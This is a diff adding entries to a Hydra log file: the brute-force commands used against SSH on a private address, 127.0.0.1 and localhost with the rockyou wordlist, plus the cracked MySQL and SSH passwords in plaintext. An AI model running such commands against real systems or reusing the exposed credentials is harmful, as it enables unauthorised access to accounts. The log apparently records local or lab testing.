@@ -29,3 +29,7 @@
 [3306][mysql] host: localhost   login: root   password: Cmonster2006
 # Hydra v9.5 run at 2023-11-10 19:53:53 on 192.168.1.38 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.38)
 [22][ssh] host: 192.168.1.38   login: zero   password: Cmonster2006
+# Hydra v9.5 run at 2023-11-10 21:59:07 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
+[22][ssh] host: 127.0.0.1   login: zero   password: Cmonster2006
+# Hydra v9.5 run at 2023-11-11 09:40:24 on localhost ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://localhost)
+[22][ssh] host: localhost   login: zero   password: Cmonster2006
